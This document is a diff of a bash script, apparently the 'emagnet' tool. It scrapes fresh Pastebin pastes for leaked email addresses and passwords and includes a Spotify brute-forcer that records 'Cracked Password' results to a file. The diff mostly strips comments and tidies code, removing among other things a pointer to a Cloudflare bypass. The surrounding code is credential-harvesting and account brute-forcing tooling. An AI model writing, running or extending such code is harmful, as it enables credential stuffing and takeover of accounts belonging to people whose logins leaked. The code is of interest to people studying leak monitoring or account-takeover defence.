@@ -504,13 +504,12 @@ emagnet_analyzer() {
     fi
 
     wait_time=$TIME
-    temp_cnt=${wait_time}
-    while [[ "${temp_cnt}" -gt "0" ]]; do
-        printf "\r              I'll Find You <-%2d -> It's A Matter Of Time" ${temp_cnt}
+    temp_cnt=$wait_time
+    while [[ $temp_cnt -gt 0 ]]; do
+        printf "\r              I'll Find You <-%2d -> It's A Matter Of Time" "$temp_cnt"
         sleep 1
         ((temp_cnt--))
     done
-
 }
 
 emagnet_move_files() {
@@ -777,11 +776,6 @@ emagnet_spotify_bruter() {
         if [[ "$?" -eq "0" ]]; then
             echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
         else
-            #                     grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
-            #                     |awk '{print $1}' \
-            #                     |cut -d':' -f2,3 \
-            #                     |cut -d'|' -f1 \
-            #                     |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt
             echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
             echo -e "================================================================" >>"$EMAGNETCRACKED/cracked-spotify-passwords.txt"
             echo -e "[+] Login Details For SPOTIFY - Cracked $(date +%d/%m/%Y\ -\ %H:%M)" >>"$EMAGNETCRACKED/cracked-spotify-passwords.txt"
@@ -850,23 +844,11 @@ emagnet_main() {
         CURL="curl -s "
     fi
 
-    #$CURL -H "$USERAGENT" -Ls "$NR1"|grep -i "https"|sort|awk '!seen[$0]++' > "$HOME/.config/emagnet/tmp/.emagnet-temp1"
     exclude='signup\|login\|archive\|_\|pastebin$\|dmca$\|tools$\|contact$\|languages'
     curl -Ls "$PASTEBIN" | awk -F'href="/' '{print $2}' | cut -d'"' -f1 | awk 'length($0)>6 && length($0)<9' | sed 's/^/https:\/\/pastebin.com\/raw\//g' | grep -v $exclude >"$HOME/.config/emagnet/tmp/.emagnet-temp1"
     ls -1 "$EMAGNETALL" | sort | awk '!seen[$0]++' | sed 's/^/https:\/\/pastebin.com\/raw\//g' >"$HOME/.config/emagnet/tmp/.emagnet-temp2"
     grep -v -x -F -f "$HOME/.config/emagnet/tmp/.emagnet-temp2" "$HOME/.config/emagnet/tmp/.emagnet-temp1" | awk -F, '!seen[$1]++' >$HOME/.config/emagnet/tmp/.emagnet-download
 
-    #-----------------------------------------------------
-    # If cloudfare is trigged, then we will do below
-    # - We wont be allowed to use wget without
-    # cookies, so then we run curl in a loop instead
-    # this is alot slower and JUST an example so please
-    # change this if you have a faster, better and more
-    # stable way to do this if cloudfare is triggered
-    #-----------------------------------------------------
-    # See how you can bypass cloudfare here:
-    # https://pastebin.com/raw/8MfnBW7r
-    #-----------------------------------------------------
     if [[ $PROXY = "true" ]]; then
         curl -sL -x socks5h://$PROXYHOST:$PROXYPORT https://pastebin.com/ | grep -io "What can I do to" &>/dev/null
     else
@@ -882,7 +864,6 @@ emagnet_main() {
         xargs -P "$(xargs --show-limits -s 1 2>&1 | grep -i "parallelism" | awk '{print $8}')" -n 1 \
             wget --no-check-certificate --user-agent="${USERAGENT}" -q -nc -P "$EMAGNETTEMP" <$HOME/.config/emagnet/tmp/.emagnet-download &>/dev/null
     fi
-    # Print total files on a better way
     tt="$(ls $EMAGNETTEMP | wc -l)"
 
     el=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP | cut -d: -f2 | tr ' ' '\n' | awk -F, '!seen[$1]++')
@@ -896,12 +877,6 @@ emagnet_main() {
     emagnet_banner
     emagnet_move_realtime
 
-    # If we found both passwords and email addresses then we do below
-    # ---------------------------------------------------------------
-    # Notice about sleep:
-    # Sleep 2 below counters is added so user will be able to see
-    # what stats we have collected, otherwise it will just
-    # go on and on and we wont see any stats
     if [[ "$pt" -gt "0" ]] && [[ "$et" -gt "0" ]]; then
         echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: Found ${pt} passwords from: $EMAGNETPW/${pf##*/}" | xargs >>"$EMAGNETLOGS/emagnet.log"
         echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: Found ${et} email addresses from: $EMAGNETDB/${ef##*/}" | xargs >>"$EMAGNETLOGS/emagnet.log"
@@ -947,7 +922,6 @@ emagnet_main() {
             sleep 0
         fi
 
-    # If we found no passwords and mail addresses only we do below
     elif [[ "$pt" = "0" ]] && [[ "$et" -gt "0" ]]; then
         echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: Found ${et} email addresses from: $EMAGNETDB/${ef##*/}" | xargs >>"$EMAGNETLOGS/emagnet.log"
         echo -e "${el}" >>$EMAGNETLOGS/emails-from-pastebin.txt
@@ -959,7 +933,6 @@ emagnet_main() {
         echo -e "                       - Email Addresses Found \r             [\e[1;32m$et\e[0m] \n"
         sleep 2
 
-    # If we found no passwords and no mail addresses we print 00
     elif [[ "$pt" = "0" ]] && [[ "$et" = "0" ]] && [[ ${tt} = "0" ]]; then
         echo -e "[\e[1;31m<<\e[0m] - No new files could be downloaded...\n[\e[1;31m<<\e[0m] - You may want to raise time in emagnet.conf.."
         sleep 2
@@ -971,26 +944,25 @@ emagnet_main() {
         sleep 2
     fi
 
-    # Cleanup, we don't need these files after we downloaded them but it must be done AFTER bruteforce and not before if bruteforce is triggered
     rm "$HOME/.config/emagnet/tmp/.emagnet-temp1" "$HOME/.config/emagnet/tmp/.emagnet-temp2" "$HOME/.config/emagnet/tmp/.emagnet-temp3" &>/dev/null
 
 }
 
 emagnet_run4ever() {
     for (( ; ; )); do
-        emagnet_conf # Source emagnet-conf so we know all settings for emagnet
+        emagnet_conf
         emagnet_first_run
         emagnet_paths
-        # emagnet_iconnection                  # Check if we got internet, otherwise we stop
+        emagnet_iconnection
         emagnet_version
-        emagnet_check_pastebin # Check if everything ARE ok and if we are allowed to visit pastebin before we doing anything
+        emagnet_check_pastebin
         emagnet_clear
         emagnet_banner
-        emagnet_analyzer          # Change this with emagnet_count_down when we have added brute force stuff again
-        emagnet_clear             # Clear screen
-        emagnet_banner            # Printbanner
-        emagnet_analyzing_message # Print Analyzing before we count data, it takes 0.9seconds and looks better
-        emagnet_main              # Scrape pastebin, download files and then count stats
+        emagnet_analyzer
+        emagnet_clear
+        emagnet_banner
+        emagnet_analyzing_message
+        emagnet_main
     done
 }
 
